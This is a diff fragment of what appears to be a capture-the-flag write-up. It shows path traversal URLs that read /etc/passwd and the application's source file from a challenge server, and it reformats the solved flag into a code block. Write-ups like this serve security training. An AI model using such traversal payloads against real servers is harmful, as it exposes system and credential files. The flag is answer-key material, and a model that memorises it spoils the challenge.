@@ -19,5 +19,7 @@ http://task.duckerz.ru:21045/preview?draft=../../../../etc/passwd
 http://task.duckerz.ru:21045/preview?draft=../../../../app/app.py
 ```
 ![](../../images/open_course_2.png)
-Флаг найден.
+# Flag
+```text
 DUCKERZ{d3BU9_COn5o1E_gr4nT5_f1nAl_6rADe}
+```
